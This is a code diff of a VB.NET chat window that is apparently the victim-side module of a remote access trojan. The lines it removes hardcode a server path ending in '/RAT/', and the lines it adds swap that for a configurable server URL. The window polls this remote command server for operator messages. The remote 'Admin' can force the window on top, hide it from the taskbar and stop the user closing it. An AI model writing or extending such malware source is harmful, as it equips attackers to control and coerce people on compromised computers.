@@ -1,10 +1,13 @@
 ﻿Imports System.ComponentModel
-Imports System.Dynamic
 Imports System.Net
 Imports System.Text
 Public Class RemoteChat
     Dim preventFormClosing As Boolean = False
-    Dim messageList As New List(Of String)
+    Dim firstIter As Boolean = True
+    Dim messageList As New List(Of Tuple(Of String, Boolean)) ' Respectively : message and isAdmin
+
+    Dim showInTB_param As Boolean = True
+    Dim topMost_param As Boolean = True
 
     Private m_MyForm As MainForm
     Public ReadOnly Property MyForm() As MainForm
@@ -19,29 +22,46 @@ Public Class RemoteChat
         msgReceiverBW.RunWorkerAsync()
     End Sub
 
-    Private Sub addChatMessage(message As String, Optional isAdmin As Boolean = False)
-        '  Console.WriteLine("message added")
-        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = "("
+    Private Sub AppendText(text As String, color As Color)
+        chatWindow.SelectionStart = chatWindow.TextLength
+        chatWindow.SelectionLength = 0
+        chatWindow.SelectionColor = color
+        chatWindow.AppendText(text)
+        chatWindow.SelectionColor = chatWindow.ForeColor
+    End Sub
+    Private Sub refreshChat()
+        Try
 
-        If isAdmin Then
-            chatWindow.SelectionColor = Color.Red : chatWindow.SelectedText = "Admin"
-        Else
-            chatWindow.SelectionColor = Color.Green : chatWindow.SelectedText = "You"
-        End If
+            chatWindow.Clear()
 
-        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = ") >> " & message & ControlChars.Lf
+            For Each message In messageList
+                AppendText("(", Color.Black)
 
-        messageList.Add(message)
-        chatWindow.ScrollToCaret()
-        chatWindow.Refresh()
+                If message.Item2 Then ' isAdmin
+                    AppendText("Admin", Color.Red)
+                Else
+                    AppendText("You", Color.Green)
+                End If
+
+                AppendText(") >> " & message.Item1 & vbCrLf, Color.Black)
+            Next
+
+            If messageList.Count > 50 Then messageList.Clear()
+            chatWindow.ScrollToCaret() : chatWindow.Refresh()
+
+        Catch ex As AccessViolationException
+            Threading.Thread.Sleep(100)
+            refreshChat()
+        End Try
     End Sub
 
     Private Sub sendButtonClickSub()
-        Dim sendMessageQuery = New WebClient().DownloadString("http://185.62.188.189/RAT/" &
+        Dim sendMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
                              "clients.php?action=clientsend" &
-                             "&actioncontent=" & messageTB.Text)
+                             "&actioncontent=" & Convert.ToBase64String(Encoding.UTF8.GetBytes(messageTB.Text)))
 
-        addChatMessage(messageTB.Text)
+        messageList.Add(New Tuple(Of String, Boolean)(messageTB.Text, False))
+        refreshChat()
         messageTB.Clear()
     End Sub
 
@@ -49,7 +69,7 @@ Public Class RemoteChat
         Dim lastMessageReceived As String = ""
 
         While True
-            Dim receivedMessageQuery = New WebClient().DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=clientreceive")
+            Dim receivedMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=clientreceive")
 
             If receivedMessageQuery = lastMessageReceived Then
                 GoTo EndOfTreatement
@@ -63,15 +83,23 @@ Public Class RemoteChat
 
             Dim parsedMessage As String() = receivedMessageQuery.Split("|")
 
-            Invoke(Sub() Me.ShowInTaskbar = parsedMessage(0) = "1")
-            Invoke(Sub() Me.TopMost = parsedMessage(1) = "1")
-            preventFormClosing = parsedMessage(2) = "1"
+            If Not firstIter Then
+                ' TODO: Replace these ugly global variables by something smarter and safer
+                showInTB_param = parsedMessage(0) = "1"
+                topMost_param = parsedMessage(1) = "1"
 
-            Dim decodedMsg As String = Encoding.UTF8.GetString(Convert.FromBase64String(parsedMessage(3)))
-            addChatMessage(decodedMsg, True)
+                preventFormClosing = parsedMessage(2) = "1"
 
+                Dim parsedMsg As String() = receivedMessageQuery.Split("|")
+                Dim decodedMsg As String = Encoding.UTF8.GetString(Convert.FromBase64String(parsedMsg(3)))
+
+                messageList.Add(New Tuple(Of String, Boolean)(decodedMsg, True))
+            End If
+
+            refreshChat()
 EndOfTreatement:
-            Threading.Thread.Sleep(200)
+            firstIter = False
+            Threading.Thread.Sleep(100)
         End While
     End Sub
 
@@ -86,7 +114,15 @@ EndOfTreatement:
     Private Sub RemoteChat_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         msgReceiverBW.CancelAsync()
         e.Cancel = preventFormClosing
-        If preventFormClosing Then MsgBox("You are not allowed to close this window.", MsgBoxStyle.Critical, "")
+
+        If preventFormClosing Then
+            MsgBox("You are not allowed to close this window.", MsgBoxStyle.Critical, "")
+        Else
+            Dim sendMessageQuery = New WebClient()
+            sendMessageQuery.DownloadString(My.Settings.vpsurl &
+                             "clients.php?action=clientsend" &
+                             "&actioncontent=" & "close")
+        End If
     End Sub
 
     Private Sub messageTB_KeyDown(sender As Object, e As KeyEventArgs) Handles messageTB.KeyDown
@@ -94,5 +130,10 @@ EndOfTreatement:
             e.SuppressKeyPress = True
             sendButtonClickSub()
         End If
+    End Sub
+
+    Private Sub paramUpdateTimer_Tick(sender As Object, e As EventArgs) Handles paramUpdateTimer.Tick
+        Me.ShowInTaskbar = showInTB_param
+        Me.TopMost = topMost_param
     End Sub
 End Class
